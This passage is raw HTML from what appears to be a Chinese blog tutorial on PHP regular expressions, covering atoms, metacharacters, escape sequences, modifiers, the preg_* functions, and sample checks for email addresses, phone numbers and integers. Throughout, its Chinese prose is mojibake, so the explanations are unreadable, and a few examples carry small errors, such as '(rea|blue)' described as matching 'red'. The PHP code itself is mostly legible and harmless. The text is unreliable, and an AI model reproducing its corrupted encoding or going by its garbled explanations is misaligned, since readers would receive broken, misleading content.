href="#ä¸‰ã€-æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆéƒ¨åˆ†ï¼š" class="headerlink" title="ä¸‰ã€ æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆéƒ¨åˆ†ï¼š"></a>ä¸‰ã€ æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆéƒ¨åˆ†ï¼š</h2><h3 id="1-åŸå­æ˜¯ç»„æˆæ­£åˆ™è¡¨è¾¾å¼çš„åŸºæœ¬å•ä½-åœ¨åˆ†ææ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œåº”ä½œä¸ºä¸€ä¸ªæ•´ä½“ã€‚"><a href="#1-åŸå­æ˜¯ç»„æˆæ­£åˆ™è¡¨è¾¾å¼çš„åŸºæœ¬å•ä½-åœ¨åˆ†ææ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œåº”ä½œä¸ºä¸€ä¸ªæ•´ä½“ã€‚" class="headerlink" title="1.åŸå­æ˜¯ç»„æˆæ­£åˆ™è¡¨è¾¾å¼çš„åŸºæœ¬å•ä½,åœ¨åˆ†ææ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œåº”ä½œä¸ºä¸€ä¸ªæ•´ä½“ã€‚"></a>1.åŸå­æ˜¯ç»„æˆæ­£åˆ™è¡¨è¾¾å¼çš„åŸºæœ¬å•ä½,åœ¨åˆ†ææ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œåº”ä½œä¸ºä¸€ä¸ªæ•´ä½“ã€‚</h3><pre class="line-numbers language-php"><code class="language-php"> åŸå­åŒ…æ‹¬ä»¥ä¸‹å†…å®¹<span class="token punctuation">:</span>        <span class="token operator">></span> å•ä¸ªå­—ç¬¦ã€æ•°å­—ï¼Œå¦‚a<span class="token operator">-</span>zï¼ŒA<span class="token operator">-</span>Zï¼Œ<span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span>ã€‚        <span class="token operator">></span> æ¨¡å¼å•å…ƒï¼Œå¦‚ï¼ˆ<span class="token constant">ABC</span>ï¼‰å¯ä»¥ç†è§£ä¸ºç”±å¤šä¸ªåŸå­ç»„æˆçš„å¤§çš„åŸå­ã€‚        <span class="token operator">></span> åŸå­è¡¨ï¼Œå¦‚ <span class="token punctuation">[</span><span class="token constant">ABC</span><span class="token punctuation">]</span>ã€‚        <span class="token operator">></span> é‡æ–°ä½¿ç”¨çš„æ¨¡å¼å•å…ƒï¼Œå¦‚ï¼š\<span class="token package"><span class="token punctuation">\</span>1</span>        <span class="token operator">></span> æ™®é€šè½¬ä¹‰å­—ç¬¦ï¼Œå¦‚ï¼š\<span class="token package">d</span>ï¼Œ \<span class="token package">D</span>ï¼Œ \<span class="token package">w</span>        <span class="token operator">></span> è½¬ä¹‰å…ƒå­—ç¬¦ï¼Œå¦‚ï¼š\<span class="token operator">*</span>ï¼Œ\<span class="token punctuation">.</span>        <span class="token operator">></span> å…ƒå­—ç¬¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-å…ƒå­—ç¬¦ï¼ˆå…·æœ‰ç‰¹æ®Šæ„ä¹‰å­—ç¬¦ï¼‰ï¼š"><a href="#2-å…ƒå­—ç¬¦ï¼ˆå…·æœ‰ç‰¹æ®Šæ„ä¹‰å­—ç¬¦ï¼‰ï¼š" class="headerlink" title="2.å…ƒå­—ç¬¦ï¼ˆå…·æœ‰ç‰¹æ®Šæ„ä¹‰å­—ç¬¦ï¼‰ï¼š"></a>2.å…ƒå­—ç¬¦ï¼ˆå…·æœ‰ç‰¹æ®Šæ„ä¹‰å­—ç¬¦ï¼‰ï¼š</h3><pre><code>        [] è¡¨ç¤ºå•ä¸ªå­—ç¬¦çš„åŸå­è¡¨            ä¾‹å¦‚ï¼š[aoeiu] è¡¨ç¤ºä»»æ„ä¸€ä¸ªå…ƒéŸ³å­—æ¯                  [0-9] è¡¨ç¤ºä»»æ„ä¸€ä½æ•°å­—                  [a-z][0-9]è¡¨ç¤ºå°å†™å­—å’Œä¸€ä½æ•°å­—æ„æˆçš„ä¸¤ä½å­—ç¬¦                  [a-zA-Z0-9] è¡¨ç¤ºä»»æ„ä¸€ä½å¤§å°å­—æ¯æˆ–æ•°å­—        [^] è¡¨ç¤ºé™¤ä¸­æ‹¬å·å†…åŸå­ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ æ˜¯[]çš„å–å            ä¾‹å¦‚ï¼š[^0-9] è¡¨ç¤ºä»»æ„ä¸€ä½éæ•°å­—å­—ç¬¦                  [^a-z] è¡¨ç¤ºä»»æ„ä¸€ä½éå°å†™å­—æ¯        {m}    è¡¨ç¤ºå¯¹å‰é¢åŸå­çš„æ•°é‡æ§åˆ¶ï¼Œè¡¨ç¤ºæ˜¯mæ¬¡            ä¾‹å¦‚ï¼š[0-9]{4} è¡¨ç¤º4ä¸ºæ•°å­—                  [1][3-8][0-9]{9} æ‰‹æœºå·ç         {m,} è¡¨ç¤ºå¯¹å‰é¢åŸå­çš„æ•°é‡æ§åˆ¶ï¼Œè¡¨ç¤ºæ˜¯è‡³å°‘mæ¬¡            ä¾‹å¦‚ï¼š [0-9]{2,} è¡¨ç¤ºä¸¤ä½åŠä»¥ä¸Šçš„æ•°å­—        {m,n}è¡¨ç¤ºå¯¹å‰é¢åŸå­çš„æ•°é‡æ§åˆ¶ï¼Œè¡¨ç¤ºæ˜¯måˆ°næ¬¡            ä¾‹å¦‚ï¼š [a-z]{6,8} è¡¨ç¤º6åˆ°8ä½çš„å°å†™å­—æ¯        * è¡¨ç¤ºå¯¹å‰é¢åŸå­çš„æ•°é‡æ§åˆ¶ï¼Œè¡¨ç¤ºæ˜¯ä»»æ„æ¬¡ï¼Œç­‰ä»·äº{0,}        + è¡¨ç¤ºå¯¹å‰é¢åŸå­çš„æ•°é‡æ§åˆ¶ï¼Œè¡¨ç¤ºè‡³å°‘1æ¬¡ï¼Œç­‰ä»·äº{1,}        ? è¡¨ç¤ºå¯¹å‰é¢åŸå­çš„æ•°é‡æ§åˆ¶ï¼Œè¡¨ç¤º0æ¬¡æˆ–1æ¬¡ï¼ˆå¯æœ‰å¯æ— ï¼‰ ç­‰ä»·äº{0,1}            ä¾‹å¦‚ï¼šæ­£æ•´æ•°ï¼š[1-9][0-9]*                    æ•´æ•°ï¼š[\-]?[0-9]+                    emailï¼šè§ä¸‹é¢è¯¦è§£        () è¡¨ç¤ºä¸€ä¸ªæ•´ä½“åŸå­ï¼Œã€è¿˜æœ‰ä¸€ä¸ªå­å­˜å‚¨å•å…ƒçš„ä½œç”¨ã€‘ã€‚                ä¹Ÿå¯ä»¥ä½¿ç”¨?:æ¥æ‹’ç»å­å­˜å‚¨ã€‚ ï¼ˆ?:.*?ï¼‰            ä¾‹å¦‚ï¼šï¼ˆredï¼‰ å­—ä¸²red                   (rea|blue) å­—ä¸²redæˆ–blue                   (abc){2} è¡¨ç¤ºä¸¤ä¸ªabc        |  è¡¨ç¤ºæˆ–çš„æ„æ€                (rea|blue) å­—ä¸²redæˆ–blue        ^  ç”¨åœ¨æ­£åˆ™å•å…ƒå—çš„å¼€å¤´å¤„ï¼Œè¡¨ç¤ºå¿…é¡»ä»¥æŒ‡å®šçš„å¼€å¤´        $  ç”¨åœ¨æ­£åˆ™å•å…ƒå—çš„ç»“å°¾å¤„ï¼Œè¡¨ç¤ºå¿…é¡»ä»¥æŒ‡å®šçš„ç»“å°¾        .  è¡¨ç¤ºä»»æ„ä¸€ä¸ªé™¤æ¢è¡Œç¬¦ä¹‹å¤–çš„å­—ç¬¦                å¸¸ç”¨ç»„åˆï¼š .*?  è¡¨ç¤º*æœ€å°åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ˆæ‹’ç»è´ªå©ªåŒ¹é…ï¼‰</code></pre><h4 id="emailï¼š"><a href="#emailï¼š" class="headerlink" title="emailï¼š"></a>emailï¼š</h4><p><a href="https://bbs.csdn.net/topics/220012055" target="_blank" rel="noopener">preg_match(â€œ/([\w-]+\@[\w-]+.[\w-]+)/â€œ,$email)</a>çš„ç†è§£</p><h5 id="1-å…³äº-ï¼š"><a href="#1-å…³äº-ï¼š" class="headerlink" title="1.å…³äº\ï¼š"></a>1.å…³äº\ï¼š</h5><pre><code> \ å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ª å‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;n&#39; åŒ¹é…å­—ç¬¦ &quot;n&quot;ã€‚&#39;\n&#39; åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚åºåˆ— &#39;\\&#39; åŒ¹é… &quot;\&quot; è€Œ &quot;\(&quot; åˆ™åŒ¹é… &quot;(&quot;ã€‚ </code></pre><h5 id="2-å…³äº-wï¼š"><a href="#2-å…³äº-wï¼š" class="headerlink" title="2.å…³äº\wï¼š"></a>2.å…³äº\wï¼š</h5><pre><code> \w åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äº&#39;[A-Za-z0-9_]&#39;ã€‚  \w-æ˜¯åŒ¹é…ä¸Šè¿°çš„å¤–åŠ å‡ </code></pre><h5 id="3-æ„é€ æ­£åˆ™è¡¨è¾¾å¼ï¼š"><a href="#3-æ„é€ æ­£åˆ™è¡¨è¾¾å¼ï¼š" class="headerlink" title="3.æ„é€ æ­£åˆ™è¡¨è¾¾å¼ï¼š"></a>3.æ„é€ æ­£åˆ™è¡¨è¾¾å¼ï¼š</h5><p> å¯ä»¥é€šè¿‡åœ¨ä¸€å¯¹åˆ†éš”ç¬¦ä¹‹é—´æ”¾å…¥è¡¨è¾¾å¼æ¨¡å¼çš„å„ç§ç»„ä»¶æ¥æ„é€ ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå³/expression/ </p><p>è€Œè¿™é‡Œæ˜¯</p><pre><code>/([\w\-]+\@[\w\-]+\.[\w\-]+)/</code></pre><h3 id="3-æ™®é€šè½¬ä¹‰å­—ç¬¦"><a href="#3-æ™®é€šè½¬ä¹‰å­—ç¬¦" class="headerlink" title="3.æ™®é€šè½¬ä¹‰å­—ç¬¦:"></a>3.æ™®é€šè½¬ä¹‰å­—ç¬¦:</h3><table><thead><tr><th align="left">\d</th><th>åŒ¹é…ä¸€ä¸ªæ•°å­—ï¼›ç­‰ä»·äº[0-9]</th></tr></thead><tbody><tr><td align="left">\D</td><td>åŒ¹é…é™¤æ•°å­—ä»¥å¤–ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼›ç­‰ä»·äº<code>[^0-9]</code></td></tr><tr><td align="left">\w</td><td>åŒ¹é…ä¸€ä¸ªè‹±æ–‡å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ï¼›ç­‰ä»·äº[0-9a-zA-Z_]</td></tr><tr><td align="left">\W</td><td>åŒ¹é…é™¤è‹±æ–‡å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ä»¥å¤–ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼›ç­‰ä»·äº<code>[^0-9a-zA-Z_]</code></td></tr><tr><td align="left">\s</td><td>åŒ¹é…ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼›ç­‰ä»·äº[\f\n\r\t\v]</td></tr><tr><td align="left">\S</td><td>åŒ¹é…é™¤ç©ºç™½å­—ç¬¦ä»¥å¤–ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼›ç­‰ä»·äº<code>[^\f\n\r\t\v]</code></td></tr><tr><td align="left">\f</td><td>åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ç­‰ä»·äº \x0c æˆ– \cL</td></tr><tr><td align="left">\n</td><td>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ï¼›ç­‰ä»·äº \x0a æˆ– \cJ</td></tr><tr><td align="left">\r</td><td>åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ç­‰ä»·äº\x0d æˆ– \cM</td></tr><tr><td align="left">\t</td><td>åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼›ç­‰ä»·äº \x09\æˆ–\cl</td></tr><tr><td align="left">\v</td><td>åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ï¼›ç­‰ä»·äº\x0bæˆ–\ck</td></tr><tr><td align="left">\oNN</td><td>åŒ¹é…ä¸€ä¸ªå…«è¿›åˆ¶æ•°å­—</td></tr><tr><td align="left">\xNN</td><td>åŒ¹é…ä¸€ä¸ªåå…­è¿›åˆ¶æ•°å­—</td></tr><tr><td align="left">\cC</td><td>åŒ¹é…ä¸€ä¸ªæ§åˆ¶å­—ç¬¦</td></tr></tbody></table><h3 id="4-æ­£åˆ™è¡¨è¾¾å¼ä¸­æ¨¡å¼ä¿®æ­£ç¬¦ä½œç”¨è¯¦è§£-iã€gã€mã€sã€xã€e"><a href="#4-æ­£åˆ™è¡¨è¾¾å¼ä¸­æ¨¡å¼ä¿®æ­£ç¬¦ä½œç”¨è¯¦è§£-iã€gã€mã€sã€xã€e" class="headerlink" title="4. æ­£åˆ™è¡¨è¾¾å¼ä¸­æ¨¡å¼ä¿®æ­£ç¬¦ä½œç”¨è¯¦è§£(iã€gã€mã€sã€xã€e)"></a>4. <a href="https://blog.csdn.net/forest_fire/article/details/50944901" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼ä¸­æ¨¡å¼ä¿®æ­£ç¬¦ä½œç”¨è¯¦è§£(iã€gã€mã€sã€xã€e)</a></h3><p>æ¨¡å¼ä¿®æ­£ç¬¦    è¯´æ˜<br>i    è¡¨ç¤ºåœ¨å’Œæ¨¡å¼è¿›è¡ŒåŒ¹é…è¿›ä¸åŒºåˆ†å¤§å°å†™<br>m    å°†æ¨¡å¼è§†ä¸ºå¤šè¡Œï¼Œä½¿ç”¨^å’Œ$è¡¨ç¤ºä»»ä½•ä¸€è¡Œéƒ½å¯ä»¥ä»¥æ­£åˆ™è¡¨è¾¾å¼å¼€å§‹æˆ–ç»“æŸ<br>s    å¦‚æœæ²¡æœ‰ä½¿ç”¨è¿™ä¸ªæ¨¡å¼ä¿®æ­£ç¬¦å·ï¼Œå…ƒå­—ç¬¦ä¸­çš„â€.â€é»˜è®¤ä¸èƒ½è¡¨ç¤ºæ¢è¡Œç¬¦å·,å°†å­—ç¬¦ä¸²è§†ä¸ºå•è¡Œ<br>x    è¡¨ç¤ºæ¨¡å¼ä¸­çš„ç©ºç™½å¿½ç•¥ä¸è®¡<br>e    æ­£åˆ™è¡¨è¾¾å¼å¿…é¡»ä½¿ç”¨åœ¨preg_replaceæ›¿æ¢å­—ç¬¦ä¸²çš„å‡½æ•°ä¸­æ—¶æ‰å¯ä»¥ä½¿ç”¨(è®²è¿™ä¸ªå‡½æ•°æ—¶å†è¯´)<br>A    ä»¥æ¨¡å¼å­—ç¬¦ä¸²å¼€å¤´ï¼Œç›¸å½“äºå…ƒå­—ç¬¦^<br>Z    ä»¥æ¨¡å¼å­—ç¬¦ä¸²ç»“å°¾ï¼Œç›¸å½“äºå…ƒå­—ç¬¦$<br>U    æ­£åˆ™è¡¨è¾¾å¼çš„ç‰¹ç‚¹ï¼šå°±æ˜¯æ¯”è¾ƒâ€œè´ªå©ªâ€ï¼Œä½¿ç”¨è¯¥æ¨¡å¼ä¿®æ­£ç¬¦å¯ä»¥å–æ¶ˆè´ªå©ªæ¨¡å¼</p><h2 id="å››ã€-æ­£åˆ™è¡¨è¾¾å¼çš„å‡½æ•°ï¼š"><a href="#å››ã€-æ­£åˆ™è¡¨è¾¾å¼çš„å‡½æ•°ï¼š" class="headerlink" title="å››ã€ æ­£åˆ™è¡¨è¾¾å¼çš„å‡½æ•°ï¼š"></a>å››ã€ æ­£åˆ™è¡¨è¾¾å¼çš„å‡½æ•°ï¼š</h2><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_filter.html" target="_blank" rel="noopener">preg_filter</a></td><td align="left">æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æœç´¢å’Œæ›¿æ¢</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_grep.html" target="_blank" rel="noopener">preg_grep</a></td><td align="left">è¿”å›åŒ¹é…æ¨¡å¼çš„æ•°ç»„æ¡ç›®</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_last_error.html" target="_blank" rel="noopener">preg_last_error</a></td><td align="left">è¿”å›æœ€åä¸€ä¸ªPCREæ­£åˆ™æ‰§è¡Œäº§ç”Ÿçš„é”™è¯¯ä»£ç </td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_match_all.html" target="_blank" rel="noopener">preg_match_all</a></td><td align="left">æ‰§è¡Œä¸€ä¸ªå…¨å±€æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">preg_match</a></td><td align="left">æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_quote.html" target="_blank" rel="noopener">preg_quote</a></td><td align="left">è½¬ä¹‰æ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_replace_callback_array.html" target="_blank" rel="noopener">preg_replace_callback_array</a></td><td align="left">æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æœç´¢å¹¶ä¸”ä½¿ç”¨ä¸€ä¸ªå›è°ƒè¿›è¡Œæ›¿æ¢</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_replace_callback.html" target="_blank" rel="noopener">preg_replace_callback</a></td><td align="left">æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æœç´¢å¹¶ä¸”ä½¿ç”¨ä¸€ä¸ªå›è°ƒè¿›è¡Œæ›¿æ¢</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_replace.html" target="_blank" rel="noopener">preg_replace</a></td><td align="left">æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_split.html" target="_blank" rel="noopener">preg_split</a></td><td align="left">é€šè¿‡ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åˆ†éš”å­—ç¬¦ä¸²</td></tr></tbody></table><h3 id="å®ä¾‹ï¼š"><a href="#å®ä¾‹ï¼š" class="headerlink" title="å®ä¾‹ï¼š"></a>å®ä¾‹ï¼š</h3><h4 id="1-æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…"><a href="#1-æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…" class="headerlink" title="1.æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…"></a>1.æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ­£åˆ™åŒ¹é…å‡½æ•°preg_match()</span><span class="token comment" spellcheck="true">//æ¨¡ç³ŠåŒ¹é…ï¼ˆåŒ…å«å½¢å¼ï¼‰</span><span class="token comment" spellcheck="true">//if(preg_match("/a/","qwertayuio")){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…å«aå­—ç¬¦</span><span class="token comment" spellcheck="true">//if(preg_match("/(abc)/","qwerta bcayuio")){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…å«abcå­—ä¸²</span><span class="token comment" spellcheck="true">//if(preg_match("/[abc]/","qwertbycuiop")){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…å«aã€bæˆ–cå­—å­—ç¬¦</span><span class="token comment" spellcheck="true">//if(preg_match("/[0-9]/","qwertbycuiop")){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…æ•°å­—</span><span class="token comment" spellcheck="true">//if(preg_match("/[a-z]/","12345a6789")){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…å°å†™å­—æ¯</span><span class="token comment" spellcheck="true">//if(preg_match("/[0-9]{2}/","qwe89rqw9re8qwer",$a)){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…ä¸¤ä½çš„æ•°å­—</span><span class="token comment" spellcheck="true">//if(preg_match("/[0-9]{2,}/","qwe12rqw9re8qwer",$a)){ //åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…è‡³å°‘ä¸¤ä½çš„æ•°å­—</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]{2,4}/"</span><span class="token punctuation">,</span><span class="token string">"qwe12567rqw9re8qwer"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//åŒ¹é…å­—ä¸²ä¸­æ˜¯å¦åŒ…è‡³å°‘ä¸¤ä½åˆ°4ä½çš„æ•°å­—</span> <span class="token keyword">echo</span> <span class="token string">"åŒ¹é…ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"ä¸åŒ¹é…ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç²¾ç¡®åŒ¹é…</span><span class="token comment" spellcheck="true">//if(preg_match("/^[0-9]{2}$/","34")){ //ç²¾ç¡®åŒ¹é…ä¸¤ä½æ•°å­—</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[1][35][0-9]{9}$/"</span><span class="token punctuation">,</span><span class="token string">"13520319616"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//åŒ¹é…ä¸€ä¸ªæ‰‹æœºå·ç </span> <span class="token keyword">echo</span> <span class="token string">"åŒ¹é…ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"ä¸åŒ¹é…ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-æ­£åˆ™çš„å…ƒå­—ç¬¦åŒ¹é…"><a href="#2-æ­£åˆ™çš„å…ƒå­—ç¬¦åŒ¹é…" class="headerlink" title="2.æ­£åˆ™çš„å…ƒå­—ç¬¦åŒ¹é…"></a>2.æ­£åˆ™çš„å…ƒå­—ç¬¦åŒ¹é…</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ­£åˆ™çš„å…ƒå­—ç¬¦ä½¿ç”¨</span><span class="token comment" spellcheck="true">//æ£€æµ‹æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„mailåœ°å€</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[\w\.]+@[\w]+(\.[a-zA-Z]+){1,3}$/"</span><span class="token punctuation">,</span><span class="token string">"asd@asd.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"æ­£ç¡®"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"é”™è¯¯"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//æ£€æµ‹æ˜¯å¦æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶æ•´æ•°ï¼ˆæ­£æ•´æ•°ï¼Œè´Ÿæ•´æ•°ï¼Œ0ï¼‰</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^-?0[xX][\da-fA-F]+$/"</span><span class="token punctuation">,</span><span class="token string">"-2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"æ­£ç¡®"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"é”™è¯¯"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//æ£€æµ‹æ˜¯å¦æ˜¯ä¸€ä¸ªæ•´æ•°ï¼ˆæ­£æ•´æ•°ï¼Œè´Ÿæ•´æ•°ï¼Œ0ï¼‰</span><span class="token comment" spellcheck="true">//if(preg_match("/^-?[0-9]+$/","-2")){</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^-?\d+$/"</span><span class="token punctuation">,</span><span class="token string">"-2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"æ­£ç¡®"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"é”™è¯¯"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//æ£€æµ‹ä¸€ä¸ªå˜é‡åæ˜¯å¦æ­£ç¡®</span><span class="token comment" spellcheck="true">//if(preg_match("/^[a-zA-Z_][a-zA-Z0-9_]*$/","1a5b_c")){</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z_][\w]*$/"</span><span class="token punctuation">,</span><span class="token string">"a5b_c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"æ­£ç¡®"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"é”™è¯¯"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//åŒ¹é…å­—ä¸²ä¸­çš„4ä½æ•°å­—</span><span class="token comment" spellcheck="true">//preg_match("/[0-9]{4}/","qweabi123srqcdwer456iabs7890asfcd",$a);</span><span class="token comment" spellcheck="true">//preg_match("/\d{4}/","qweabi123srqcdwer456iabs7890asfcd",$a);</span><span class="token comment" spellcheck="true">//var_dump($a[0]); //åŒ¹é…:7890</span><span class="token comment" spellcheck="true">//preg_match_all("/(ab|cd)/","qweabisrqcdweriabsasfcd",$a);</span><span class="token comment" spellcheck="true">//var_dump($a[0]); //åŒ¹é…å­—ä¸²æ‰€æœ‰abæˆ–cd</span><span class="token comment" spellcheck="true">//preg_match_all("/is/","qweisrqwerisasfd",$a);</span><span class="token comment" spellcheck="true">//var_dump($a); //åŒ¹é…å­—ä¸²æ‰€æœ‰is</span><span class="token comment" spellcheck="true">//preg_match("/.*/","*a\nbc",$a);</span><span class="token comment" spellcheck="true">//var_dump($a); //*a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç½‘é¡µ"><a href="#3-æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç½‘é¡µ" class="headerlink" title="3.æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç½‘é¡µ"></a>3.æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç½‘é¡µ</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ­£åˆ™åŒ¹é…å‡½æ•°ï¼špreg_match preg_match_all</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span>yfstr <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mainNav<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clearfix<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span 